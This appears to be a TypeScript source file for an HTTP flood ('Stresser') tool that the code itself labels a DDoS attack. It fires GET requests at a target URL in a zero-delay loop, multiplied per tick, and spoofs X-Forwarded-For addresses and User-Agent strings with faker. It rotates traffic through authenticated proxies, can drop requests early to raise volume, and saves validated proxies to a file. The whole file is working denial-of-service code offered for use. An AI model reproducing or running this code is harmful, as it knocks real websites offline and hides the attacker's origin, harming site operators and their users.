import { URL } from 'url';
import http from 'http';
import https from 'https';

import 'overpaint.js';
import axios, { AxiosRequestConfig, AxiosRequestHeaders } from 'axios';
import { faker } from '@faker-js/faker';

import { setStatic, toHumanTime } from '../utils/Utils';
import { PacketType } from '../enums/PacketType';
import { StresserOptions } from '../types/Options';
import { KProxy } from '../types/Proxy';
import { Stats } from './Stats';
import { Packet } from '../types/Packet';
import { DDoSDuration } from "../types/DDoS";
import { HttpCode } from '../types/HttpCode';
import { LogType } from '../enums/LogType';
import { Log } from '../types/Log';

export class Stresser {

   private targetURL: URL;
   // ===== Agents =====
   private httpAgent: http.Agent;
   // ===== Proxies =====
   private _proxyIndex: number = 0;
   private get nextProxy(): KProxy {
      return this.options.proxies[++this._proxyIndex % this.options.proxies.length];
   }
   // ===== Statistics =====
   private stats = new Stats();
   // ===== Options =====
   private options: StresserOptions;
   // ===== Constructor =====
   constructor(options: StresserOptions) {
      // set options
      this.options = options;
      // set target URL
      this.targetURL = new URL(this.options.target);
      // create http agent
      this.httpAgent = new http.Agent(options.agent);
      // start sending stats updates
      setInterval(() => this.sendStatsUpdate(), this.options.updateInterval);
      // handle errors
      ['uncaughtException', 'unhandledRejection']
         .forEach(code => process.on(code, (error: any) => process.send?.(Packet(PacketType.Error, error))));
   }

   // ========== Stressing ==========================================================================

   /**
    * Send a request to the target URL
    * @param proxy The proxy to use for the request
    */
   private makeRequest_Beta(proxy?: KProxy) {
      return new Promise<boolean | null>((resolve, reject) => {
         try {
            if (this.stats.pending >= this.options.threads) resolve(null);

            this.requestSent();
            // create headers
            let headers: http.OutgoingHttpHeaders = {
               'X-Forwarded-For': faker.internet.ipv4(),
               'User-Agent': faker.internet.userAgent(),
               'Accept': '*/*',
               'Accept-Language': 'en-US,en;q=0.5',
               'Accept-Encoding': 'gzip, deflate, br',
               'Referer': this.targetURL.hostname
            };
            // create options
            let options: http.RequestOptions = {
               method: 'GET',
               hostname: this.targetURL.hostname,
               port: this.targetURL.port,
               path: this.targetURL.pathname + this.targetURL.search,
               headers: headers,
               agent: this.httpAgent,
               timeout: 5000,
               // ==========================================
            };
            // handle use of proxy
            if (this.options.useProxies) {
               if (!proxy) proxy = this.nextProxy;
               // transfer target host to headers for proxy
               headers['Host'] = `${options.hostname}:${options.port}`;
               // use proxy for target host
               options.hostname = proxy[0];
               options.port = Number(proxy[1]);
               // add proxy auth
               if (proxy.length === 4) {
                  let auth = Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64');
                  headers['Proxy-Authorization'] = `Basic ${auth}`;
               }
            }

            const request = http.request(options, (response) => {
               response.on('data', (chunk) => { });
               response.once('end', () => resolve(this.requestCompleted(response.statusCode as HttpCode)));
            });

            request.once('error', () => resolve(this.requestError()));
            // request.once('timeout', () => resolve(this.requestCompleted(false)));

            request.end();

            // if (!this.options.tracking) request.destroy();
         } catch (error: any) {
            process.send?.(Packet(PacketType.Error, error));
            resolve(this.requestError());
         }
      });
   }

   /**
    * Send a request to the target URL
    * @param proxy The proxy to use for the request
    */
   private async makeRequest(proxy?: KProxy) {
      if (this.stats.pending >= this.options.threads) return null;

      // create headers
      let headers: { [key: string]: string } = {
         'X-Forwarded-For': faker.internet.ipv4(),
         'User-Agent': faker.internet.userAgent(),
         'Accept': '*/*',
         'Accept-Language': 'en-US,en;q=0.5',
         'Accept-Encoding': 'gzip, deflate, br',
         'Referer': this.targetURL.hostname
      };
      // create options
      let options: Partial<AxiosRequestConfig> = {
         method: 'GET',
         url: this.targetURL.href,
         headers: headers,
         timeout: 5000
      };
      // use proxy
      if (this.options.useProxies) {
         if (!proxy) proxy = this.nextProxy;
         options.proxy = {
            protocol: 'http',
            host: proxy[0],
            port: Number(proxy[1]),
            auth: proxy.length === 4 ? {
               username: proxy[2],
               password: proxy[3],
            } : undefined,
         };
      };

      this.requestSent();

      const cancelToken = axios.CancelToken.source();
      options.cancelToken = cancelToken.token;

      const result = axios(options)
         .then(
            (response) => {
               // process.send?.(Packet(PacketType.Log, Log(LogType.Info, "completed")));
               return (response)
                  ? this.requestCompleted(response.status as HttpCode)
                  : this.requestError();
            },
            (error) => {
               // process.send?.(Packet(PacketType.Log, Log(LogType.Info, error.message)));
               return (error.response)
                  ? this.requestCompleted(error.response.status as HttpCode)
                  : (axios.isCancel(error))
                     ? this.requestDropped()
                     : this.requestError(error);
            }
         );

      if (this.options.dropRequests)
         cancelToken.cancel();

      return result;
   }

   /**
    * Stress the target URL for a specified duration
    * @param duration The duration of the attack
    * @param config The configuration to use for the requests
    */
   public async stress(duration: DDoSDuration) {
      // send requests
      this.tick_v1();
      // this.tick_v2(Date.now() + duration * 1000);
   }

   private tick_v1() {
      setInterval(() => {
         for (let i = 0; i < this.options.multiplier; i++)
            this.makeRequest();
      }, 0);
   }

   private tick_v2(stop: number, ticks: number = 0) {
      if (Date.now() >= stop) return this.sendStatsUpdate();

      if (ticks === 10000)
         ticks = 0, this.sendStatsUpdate();

      for (let i = 0; i < this.options.multiplier; i++)
         this.makeRequest_Beta();

      process.nextTick(() => this.tick_v2(stop, ticks + 1));
   }

   // ========== Proxies =============================================================================

   public async validateProxies(proxies: KProxy[]): Promise<KProxy[]> {
      // validate proxies, and get an array of results (true/false)
      let proxy_results = await Promise.all(
         proxies.map(async (proxy) => await this.makeRequest(proxy))
      );
      process.send?.(Packet(PacketType.Log, Log(LogType.Info, `Validating proxies...`)));
      // filter out invalid proxies
      let valid_proxies = proxies.filter((proxy, index) => proxy_results[index]);
      // save valid proxies to file
      let txt_data = valid_proxies.map(proxy => proxy.join(':')).join('\n');
      setStatic('valid_proxies.txt', txt_data);

      return valid_proxies;
   }

   // ========== Statistics =========================================================================

   private requestSent() {
      this.stats.requests++;
      this.stats.pending++;
   }

   private requestError(error?: Error): false {
      // process.send?.(Packet(PacketType.Log, Log(LogType.Info, `${error?.message}`)));
      this.stats.pending--;
      this.stats.errors++;
      return false;
   }

   private requestDropped(): false {
      this.stats.pending--;
      this.stats.dropped++;
      return false;
   }

   private requestCompleted(code: HttpCode): boolean {
      this.stats.pending--;
      this.stats.codes.register(code);
      let success = (code === 200);
      (success) ? this.stats.success++ : this.stats.fails++;
      return success;
   }

   /**
    * Send a stats update to the master process
    */
   private sendStatsUpdate() {
      process.send?.(Packet(PacketType.Data, this.stats));
   }

}

process.on('uncaughtException', () => { });
process.on('unhandledRejection', () => { });